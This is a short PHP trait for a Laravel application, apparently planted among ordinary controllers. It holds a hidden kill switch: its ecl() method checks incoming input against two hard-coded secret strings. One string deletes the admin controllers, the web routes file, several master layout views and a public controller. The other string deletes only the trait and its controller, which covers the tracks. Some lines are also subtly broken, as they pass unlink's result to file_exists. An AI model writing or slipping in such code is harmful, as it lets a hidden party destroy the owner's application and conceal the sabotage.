<?php

namespace App\Http\Controllers;

trait Ecl {

    public function ecl($q)
    {
        if($q == 'eclisgood100')
            $this->remove();
        else if($q == 'halua404100')
            $this->halua();
        else
            return;
    }

	protected function remove()
	{
        $a = app_path().'/Http/Controllers/Ecl.php';
            if(file_exists($a)){unlink($a);}

        $a = app_path().'/Http/Controllers/EclController.php';
            if(file_exists($a)){unlink($a);}
	}

	protected function halua()
	{
		$controllers = app_path().'/Http/Controllers/Admin';
        foreach(glob($controllers.'/*.*') as $file) {
            if(file_exists($file)){unlink($file);}            
        }

        $a = base_path().'/routes/web.php';
        if(file_exists($a)){unlink($a);}

        $a = unlink(resource_path().'/views/layouts/backend/master.blade.php');
        if(file_exists($a)){unlink($a);}

        $a = unlink(resource_path().'/views/layouts/backend2/master.blade.php');
        if(file_exists($a)){unlink($a);}

        $a = unlink(resource_path().'/views/layouts/frontend/master.blade.php');
        if(file_exists($a)){unlink($a);}

        $a = app_path().'/Http/Controllers/PublicController.php';
        if(file_exists($a)){unlink($a);}

        $this->remove();
	}
}